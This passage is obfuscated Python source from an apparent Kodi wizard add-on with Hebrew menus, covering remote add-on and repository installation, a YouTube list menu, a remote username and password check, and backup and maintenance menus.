	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2499
	setView ('files','viewType')#line:2500
def addonInstaller (O00O00O0O0O00OO0O ,OOOOOO00O0O0OO0O0 ):#line:2502
	if not ADDONFILE =='http://':#line:2503
		OO00OOOOO0O00000O =wiz .workingURL (OOOOOO00O0O0OO0O0 )#line:2504
		if OO00OOOOO0O00000O ==True :#line:2505
			OO0O000O0OO0O000O =wiz .openURL (OOOOOO00O0O0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2506
			OOO0OO0000OOO0O0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O00O0O0O00OO0O ).findall (OO0O000O0OO0O000O )#line:2507
			if len (OOO0OO0000OOO0O0O )>0 :#line:2508
				for O0O0O000OOO0OOO0O ,OOOOOO00O0O0OO0O0 ,OO00O0OO00O0OO000 ,OOO00O0O0O000OOOO ,O00O00O00OOOO00OO ,O000000OO000OOO00 ,O0000O000OOO0O00O ,O0O00000OOOO00OOO ,OO0O0O00OOO0OO0OO in OOO0OO0000OOO0O0O :#line:2509
					if os .path .exists (os .path .join (ADDONS ,O00O00O0O0O00OO0O )):#line:2510
						OO0O00O0O0OO00OOO =['Launch Addon','Remove Addon']#line:2511
						O00000000OO0O0OO0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0O00O0O0OO00OOO )#line:2512
						if O00000000OO0O0OO0 ==0 :#line:2513
							wiz .ebi ('RunAddon(%s)'%O00O00O0O0O00OO0O )#line:2514
							xbmc .sleep (1000 )#line:2515
							return True #line:2516
						elif O00000000OO0O0OO0 ==1 :#line:2517
							wiz .cleanHouse (os .path .join (ADDONS ,O00O00O0O0O00OO0O ))#line:2518
							try :wiz .removeFolder (os .path .join (ADDONS ,O00O00O0O0O00OO0O ))#line:2519
							except :pass #line:2520
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O00O0O0O00OO0O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2521
								removeAddonData (O00O00O0O0O00OO0O )#line:2522
							wiz .refresh ()#line:2523
							return True #line:2524
						else :#line:2525
							return False #line:2526
					OOOOO0000O0OO000O =os .path .join (ADDONS ,OO00O0OO00O0OO000 )#line:2527
					if not OO00O0OO00O0OO000 .lower ()=='none'and not os .path .exists (OOOOO0000O0OO000O ):#line:2528
						wiz .log ("Repository not installed, installing it")#line:2529
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00O00O0O0O00OO0O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO00O0OO00O0OO000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2530
							OOOO0O0O00O00000O =wiz .parseDOM (wiz .openURL (OOO00O0O0O000OOOO ),'addon',ret ='version',attrs ={'id':OO00O0OO00O0OO000 })#line:2531
							if len (OOOO0O0O00O00000O )>0 :#line:2532
								O000OOOOO0O000OOO ='%s%s-%s.zip'%(O00O00O00OOOO00OO ,OO00O0OO00O0OO000 ,OOOO0O0O00O00000O [0 ])#line:2533
								wiz .log (O000OOOOO0O000OOO )#line:2534
								if KODIV >=17 :wiz .addonDatabase (OO00O0OO00O0OO000 ,1 )#line:2535
								installAddon (OO00O0OO00O0OO000 ,O000OOOOO0O000OOO )#line:2536
								wiz .ebi ('UpdateAddonRepos()')#line:2537
								wiz .log ("Installing Addon from Kodi")#line:2539
								OOO0O0OO0O0000000 =installFromKodi (O00O00O0O0O00OO0O )#line:2540
								wiz .log ("Install from Kodi: %s"%OOO0O0OO0O0000000 )#line:2541
								if OOO0O0OO0O0000000 :#line:2542
									wiz .refresh ()#line:2543
									return True #line:2544
							else :#line:2545
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO00O0OO00O0OO000 )#line:2546
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00O00O0O0O00OO0O ,OO00O0OO00O0OO000 ))#line:2547
					elif OO00O0OO00O0OO000 .lower ()=='none':#line:2548
						wiz .log ("No repository, installing addon")#line:2549
						OO0O00OOO00O00OO0 =O00O00O0O0O00OO0O #line:2550
						OO0OO0OOO00OOO0OO =OOOOOO00O0O0OO0O0 #line:2551
						installAddon (O00O00O0O0O00OO0O ,OOOOOO00O0O0OO0O0 )#line:2552
						wiz .refresh ()#line:2553
						return True #line:2554
					else :#line:2555
						wiz .log ("Repository installed, installing addon")#line:2556
						OOO0O0OO0O0000000 =installFromKodi (O00O00O0O0O00OO0O ,False )#line:2557
						if OOO0O0OO0O0000000 :#line:2558
							wiz .refresh ()#line:2559
							return True #line:2560
					if os .path .exists (os .path .join (ADDONS ,O00O00O0O0O00OO0O )):return True #line:2561
					O0OOO0O0O0O00O0OO =wiz .parseDOM (wiz .openURL (OOO00O0O0O000OOOO ),'addon',ret ='version',attrs ={'id':O00O00O0O0O00OO0O })#line:2562
					if len (O0OOO0O0O0O00O0OO )>0 :#line:2563
						OOOOOO00O0O0OO0O0 ="%s%s-%s.zip"%(OOOOOO00O0O0OO0O0 ,O00O00O0O0O00OO0O ,O0OOO0O0O0O00O0OO [0 ])#line:2564
						wiz .log (str (OOOOOO00O0O0OO0O0 ))#line:2565
						if KODIV >=17 :wiz .addonDatabase (O00O00O0O0O00OO0O ,1 )#line:2566
						installAddon (O00O00O0O0O00OO0O ,OOOOOO00O0O0OO0O0 )#line:2567
						wiz .refresh ()#line:2568
					else :#line:2569
						wiz .log ("no match");return False #line:2570
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2571
		else :wiz .log ("[Addon Installer] Text File: %s"%OO00OOOOO0O00000O )#line:2572
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2573
def installFromKodi (O00OO0OO0OOO00OOO ,over =True ):#line:2575
	if over ==True :#line:2576
		xbmc .sleep (2000 )#line:2577
	wiz .ebi ('RunPlugin(plugin://%s)'%O00OO0OO0OOO00OOO )#line:2579
	if not wiz .whileWindow ('yesnodialog'):#line:2580
		return False #line:2581
	xbmc .sleep (1000 )#line:2582
	if wiz .whileWindow ('okdialog'):#line:2583
		return False #line:2584
	wiz .whileWindow ('progressdialog')#line:2585
	if os .path .exists (os .path .join (ADDONS ,O00OO0OO0OOO00OOO )):return True #line:2586
	else :return False #line:2587
def installAddon (OOO0OOOO0OOO0O000 ,OO000O0OOOO00O0O0 ):#line:2589
	if not wiz .workingURL (OO000O0OOOO00O0O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOO0OOOO0OOO0O000 ,COLOR2 ));return #line:2590
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2591
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOOO0OOO0O000 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2592
	O000OO0O0OOOO00O0 =OO000O0OOOO00O0O0 .split ('/')#line:2593
	OO0O000O000OO0OO0 =os .path .join (PACKAGES ,O000OO0O0OOOO00O0 [-1 ])#line:2594
	try :os .remove (OO0O000O000OO0OO0 )#line:2595
	except :pass #line:2596
	downloader .download (OO000O0OOOO00O0O0 ,OO0O000O000OO0OO0 ,DP )#line:2597
	O0OO00OOOO0000000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOOO0OOO0O000 )#line:2598
	DP .update (0 ,O0OO00OOOO0000000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2599
	O00O0O0OOOOOOO000 ,O0O000O00OOOOO000 ,O00O0O000O00O0O00 =extract .all (OO0O000O000OO0OO0 ,ADDONS ,DP ,title =O0OO00OOOO0000000 )#line:2600
	DP .update (0 ,O0OO00OOOO0000000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2601
	installed (OOO0OOOO0OOO0O000 )#line:2602
	installDep (OOO0OOOO0OOO0O000 ,DP )#line:2603
	DP .close ()#line:2604
	wiz .ebi ('UpdateAddonRepos()')#line:2605
	wiz .ebi ('UpdateLocalAddons()')#line:2606
	wiz .refresh ()#line:2607
def installDep (OOOO00O0OO0O000O0 ,DP =None ):#line:2609
	O000O0OOO0O0OOO00 =os .path .join (ADDONS ,OOOO00O0OO0O000O0 ,'addon.xml')#line:2610
	if os .path .exists (O000O0OOO0O0OOO00 ):#line:2611
		OOO00OOOO0O0O0OO0 =open (O000O0OOO0O0OOO00 ,mode ='r');OO00O00O0000O00O0 =OOO00OOOO0O0O0OO0 .read ();OOO00OOOO0O0O0OO0 .close ();#line:2612
		O0O000000OO0O00OO =wiz .parseDOM (OO00O00O0000O00O0 ,'import',ret ='addon')#line:2613
		for O0OOOOOO0O000OO00 in O0O000000OO0O00OO :#line:2614
			if not 'xbmc.python'in O0OOOOOO0O000OO00 :#line:2615
				if not DP ==None :#line:2616
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOOOO0O000OO00 ))#line:2617
				wiz .createTemp (O0OOOOOO0O000OO00 )#line:2618
def installed (OO0O0OO00OOOO0OOO ):#line:2645
	OOO0O00OO0O0OOOO0 =os .path .join (ADDONS ,OO0O0OO00OOOO0OOO ,'addon.xml')#line:2646
	if os .path .exists (OOO0O00OO0O0OOOO0 ):#line:2647
		try :#line:2648
			OO0OOO0O00OO00OOO =open (OOO0O00OO0O0OOOO0 ,mode ='r');OOOOO00000OOOO0OO =OO0OOO0O00OO00OOO .read ();OO0OOO0O00OO00OOO .close ()#line:2649
			O000OO00O00OOO0OO =wiz .parseDOM (OOOOO00000OOOO0OO ,'addon',ret ='name',attrs ={'id':OO0O0OO00OOOO0OOO })#line:2650
			OO0OO0000OO00OOO0 =os .path .join (ADDONS ,OO0O0OO00OOOO0OOO ,'icon.png')#line:2651
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000OO00O00OOO0OO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0OO0000OO00OOO0 )#line:2652
		except :pass #line:2653
def youtubeMenu (url =None ):#line:2655
	if not YOUTUBEFILE =='http://':#line:2656
		if url ==None :#line:2657
			OOOO00O000OOO000O =wiz .workingURL (YOUTUBEFILE )#line:2658
			O00O000OO0O0OO00O =uservar .YOUTUBEFILE #line:2659
		else :#line:2660
			OOOO00O000OOO000O =wiz .workingURL (url )#line:2661
			O00O000OO0O0OO00O =url #line:2662
		if OOOO00O000OOO000O ==True :#line:2663
			OO0OO0OO00OOO0OO0 =wiz .openURL (O00O000OO0O0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2664
			OO0000000O0OO00O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO0OO00OOO0OO0 )#line:2665
			if len (OO0000000O0OO00O0 )>0 :#line:2666
				for O0O000O0O0O000000 ,OO0OOO00OOOOO0OOO ,url ,O000O000O000O0O0O ,OO0000OOO0000O00O ,OO0OO0O000OOOO0OO in OO0000000O0OO00O0 :#line:2667
					if OO0OOO00OOOOO0OOO .lower ()=="yes":#line:2668
						addDir ("[B]%s[/B]"%O0O000O0O0O000000 ,'youtube',url ,description =OO0OO0O000OOOO0OO ,icon =O000O000O000O0O0O ,fanart =OO0000OOO0000O00O ,themeit =THEME3 )#line:2669
					else :#line:2670
						addFile (O0O000O0O0O000000 ,'viewVideo',url =url ,description =OO0OO0O000OOOO0OO ,icon =O000O000O000O0O0O ,fanart =OO0000OOO0000O00O ,themeit =THEME2 )#line:2671
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2672
		else :#line:2673
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2674
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2675
			addFile ('%s'%OOOO00O000OOO000O ,'',themeit =THEME3 )#line:2676
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2677
	setView ('files','viewType')#line:2678
def STARTP ():#line:2679
	O00OOO00OOO0O0O0O =(ADDON .getSetting ("pass"))#line:2680
	if BUILDNAME =="":#line:2681
	 if not NOTIFY =='true':#line:2682
          O0000OO00OO00O000 =wiz .workingURL (NOTIFICATION )#line:2683
	 if not NOTIFY2 =='true':#line:2684
          O0000OO00OO00O000 =wiz .workingURL (NOTIFICATION2 )#line:2685
	 if not NOTIFY3 =='true':#line:2686
          O0000OO00OO00O000 =wiz .workingURL (NOTIFICATION3 )#line:2687
	O000O00O0OOOO000O =O00OOO00OOO0O0O0O #line:2688
	O0000OO00OO00O000 =urllib2 .Request (SPEED )#line:2689
	O0OOO00OOOOOOOO0O =urllib2 .urlopen (O0000OO00OO00O000 )#line:2690
	OO00OOO00OOOO00OO =O0OOO00OOOOOOOO0O .readlines ()#line:2692
	O0OOOOO000O000O00 =0 #line:2696
	for OOOO0O0O00000OO00 in OO00OOO00OOOO00OO :#line:2697
		if OOOO0O0O00000OO00 .split (' ==')[0 ]==O00OOO00OOO0O0O0O or OOOO0O0O00000OO00 .split ()[0 ]==O00OOO00OOO0O0O0O :#line:2698
			O0OOOOO000O000O00 =1 #line:2699
			break #line:2700
	if O0OOOOO000O000O00 ==0 :#line:2701
					OOOOO0O0OO0O000O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2702
					if OOOOO0O0OO0O000O0 :#line:2704
						ADDON .openSettings ()#line:2706
						sys .exit ()#line:2708
					else :#line:2709
						sys .exit ()#line:2710
	return 'ok'#line:2714
def STARTP2 ():#line:2715
	OOO0O0000OOOOO0O0 =(ADDON .getSetting ("user"))#line:2716
	OO00O0OO0OOO00000 =(UNAME )#line:2718
	OO00OOO0000O0O0O0 =urllib2 .urlopen (OO00O0OO0OOO00000 )#line:2719
	O00O00O0OOO00O000 =OO00OOO0000O0O0O0 .readlines ()#line:2720
	OOOO00O000OO0OO0O =0 #line:2721
	for OO00O000000O0O00O in O00O00O0OOO00O000 :#line:2724
		if OO00O000000O0O00O .split (' ==')[0 ]==OOO0O0000OOOOO0O0 or OO00O000000O0O00O .split ()[0 ]==OOO0O0000OOOOO0O0 :#line:2725
			OOOO00O000OO0OO0O =1 #line:2726
			break #line:2727
	if OOOO00O000OO0OO0O ==0 :#line:2728
		O0OOO00000OOOOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2729
		if O0OOO00000OOOOO00 :#line:2731
			ADDON .openSettings ()#line:2733
			sys .exit ()#line:2736
		else :#line:2737
			sys .exit ()#line:2738
	return 'ok'#line:2742
def passandpin ():#line:2743
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2744
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2745
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2746
def passandUsername ():#line:2747
	ADDON .openSettings ()#line:2748
def folderback ():#line:2751
    O00OO0OOOO00O0OO0 =ADDON .getSetting ("path")#line:2752
    if O00OO0OOOO00O0OO0 :#line:2753
      O00OO0OOOO00O0OO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2754
      ADDON .setSetting ("path",O00OO0OOOO00O0OO0 )#line:2755
def backmyupbuild ():#line:2758
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2762
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2763
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2764
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2766
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2767
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2768
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2770
def maintMenu (view =None ):#line:2774
	OO0O0O000O0O00O00 ='[B][COLOR green]ON[/COLOR][/B]';OOO0O0OO0OOOO00O0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2776
	OOOOOO000O00000OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2777
	O0OO0O0O0OO000OOO ='true'if AUTOCACHE =='true'else 'false'#line:2778
	OO00OO00OOOOO0000 ='true'if AUTOPACKAGES =='true'else 'false'#line:2779
	O000O0OOOOOO000OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2780
	OOOO0O0O0O00OO0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2781
	OO0O0O00OOOOO0OO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2782
	O0000000OOO0OO00O ='true'if INCLUDEALL =='true'else 'false'#line:2783
	O0O0OO00000OO00OO ='true'if THIRDPARTY =='true'else 'false'#line:2784
	if wiz .Grab_Log (True )==False :O0OOOOO0OOOO00OO0 =0 #line:2785
	else :O0OOOOO0OOOO00OO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2786
	if wiz .Grab_Log (True ,True )==False :O0O00OOO0O00OO0O0 =0 #line:2787
	else :O0O00OOO0O00OO0O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2788
	O0OO00000OOOO0OOO =int (O0OOOOO0OOOO00OO0 )+int (O0O00OOO0O00OO0O0 )#line:2789
	O00OO0O0000000OOO =str (O0OO00000OOOO0OOO )+' Error(s) Found'if O0OO00000OOOO0OOO >0 else 'None Found'#line:2790
	OO0O0O000O00OO00O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2791
	if O0000000OOO0OO00O =='true':#line:2792
		O0OO0000O0000OO0O ='true'#line:2793
		O000OO00000OO0OO0 ='true'#line:2794
		OO0000OOO00OOOOO0 ='true'#line:2795
		O000O0O0OOOOO0O00 ='true'#line:2796
		O000OOO00000OO0O0 ='true'#line:2797
		OO0O0OOO0OO0OO0O0 ='true'#line:2798
		O0000O000O0O00000 ='true'#line:2799
		OO000OO00O0OO000O ='true'#line:2800
	else :#line:2801
		O0OO0000O0000OO0O ='true'if INCLUDEBOB =='true'else 'false'#line:2802
		O000OO00000OO0OO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2803
		OO0000OOO00OOOOO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2804
		O000O0O0OOOOO0O00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2805
		O000OOO00000OO0O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2806
		OO0O0OOO0OO0OO0O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2807
		O0000O000O0O00000 ='true'if INCLUDESALTS =='true'else 'false'#line:2808
		OO000OO00O0OO000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2809
	O0000OOO0000000O0 =wiz .getSize (PACKAGES )#line:2810
	O000OOOOO0OO0O00O =wiz .getSize (THUMBS )#line:2811
	O00OOO000OO0O0OO0 =wiz .getCacheSize ()#line:2812
	OOO00OOOO0O00OOO0 =O0000OOO0000000O0 +O000OOOOO0OO0O00O +O00OOO000OO0O0OO0 #line:2813
	OO0O00OOOO0000O0O =['Daily','Always','3 Days','Weekly']#line:2814
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2815
	if view =="clean"or SHOWMAINT =='true':#line:2816
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00OOOO0O00OOO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2817
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOO000OO0O0OO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000OOO0000000O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOOOO0OO0O00O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2820
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2824
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2825
	if view =="addon"or SHOWMAINT =='false':#line:2826
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2833
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2834
	if view =="misc"or SHOWMAINT =='true':#line:2835
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('View Errors in Log: %s'%(O00OO0O0000000OOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('Clear Wizard Log File%s'%OO0O0O000O00OO00O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2844
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2845
	if view =="backup"or SHOWMAINT =='true':#line:2846
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2858
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2859
	if view =="tweaks"or SHOWMAINT =='true':#line:2860
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2861
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		else :#line:2863
			if os .path .exists (ADVANCED ):#line:2864
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2865
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2866
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2873
	addFile ('Show All Maintenance: %s'%OOOO0O0O0O00OO0O0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2874
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2875
	addFile ('Third Party Wizards: %s'%O0O0OO00000OO00OO .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2876
	if O0O0OO00000OO00OO =='true':#line:2877
		O0OOO0O00O00O0OOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2878
		O0O000O0O0OO000OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2879
		OOO00OOOOOOOOOO00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2880
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO0O00O00O0OOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O000O0O0OO000OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00OOOOOOOOOO00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2883
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2884
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOOOO000O00000OO .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2885
	if OOOOOO000O00000OO =='true':#line:2886
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0O00OOOO0000O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO0O0O0OO000OOO .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2888
